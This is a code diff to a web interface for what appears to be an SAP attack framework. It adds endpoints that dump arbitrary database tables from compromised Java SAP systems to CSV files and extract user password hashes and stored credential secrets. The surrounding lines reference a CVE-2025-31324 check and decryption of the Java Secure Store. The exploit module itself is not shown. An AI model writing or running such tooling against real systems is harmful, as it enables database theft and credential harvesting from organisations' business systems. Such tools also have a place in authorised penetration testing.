@@ -1250,6 +1250,78 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/download_java_table", method="POST")
+    def node_download_java_table(sid):
+        """Run a SELECT against the Java stack's DB via JSP/JDBC."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if "JAVA" not in (node.system_type or "").upper():
+            return json.dumps({"error": "Not a Java/dual-stack system"})
+        table  = (data.get("table") or "").strip()
+        fields = (data.get("fields") or "*").strip()
+        where  = (data.get("where") or "").strip()
+        try:
+            max_rows = int(data.get("max_rows") or 500)
+        except Exception:
+            max_rows = 500
+        if not table:
+            return json.dumps({"error": "table is required"})
+
+        def _run():
+            r = sapmap_exploit.download_java_table(
+                node, table, fields=fields, where=where, max_rows=max_rows)
+            if r.get("success"):
+                # Stash for the modal to pick up
+                if not hasattr(node, "java_table_dumps"):
+                    node.java_table_dumps = []
+                node.java_table_dumps.append({
+                    "table": table, "columns": r.get("columns", []),
+                    "rows": r.get("rows", []),
+                    "row_count": r.get("row_count", 0),
+                })
+                # Persist to states/ as CSV
+                import os as _os
+                from datetime import datetime as _dt
+                states_dir = _os.path.join(_os.path.dirname(__file__), "states")
+                _os.makedirs(states_dir, exist_ok=True)
+                ts = _dt.now().strftime("%Y%m%d_%H%M%S")
+                fpath = _os.path.join(states_dir,
+                    f"table_java_{sid}_{table.replace('.','_')}_{ts}.csv")
+                import csv as _csv
+                with open(fpath, "w", newline="", encoding="utf-8") as fh:
+                    w = _csv.writer(fh)
+                    w.writerow(r.get("columns", []))
+                    for row in r.get("rows", []):
+                        w.writerow(row)
+                print(f"[+] {sid}: rows written to {fpath}")
+
+        _bg(f"{sid}:download_java_table", "Download Java Table", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/extract_java_hashes", method="POST")
+    def node_extract_java_hashes(sid):
+        """Extract UME password hashes + J2EE_CONFIGENTRY credential entries."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if "JAVA" not in (node.system_type or "").upper():
+            return json.dumps({"error": "Not a Java/dual-stack system"})
+
+        def _run():
+            r = sapmap_exploit.extract_java_password_hashes(node)
+            if r.get("success"):
+                print(f"[+] {sid}: hash extraction summary — "
+                      f"{r.get('count', 0)} UME hashes, "
+                      f"{r.get('configentry_secret_count', 0)} configentry "
+                      f"secrets, file: {r.get('file_path')}")
+
+        _bg(f"{sid}:extract_java_hashes", "Extract Java Hashes", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/java_secstore", method="POST")
     def node_java_secstore(sid):
         """Extract + decrypt the Java Secure Store; import credentials and
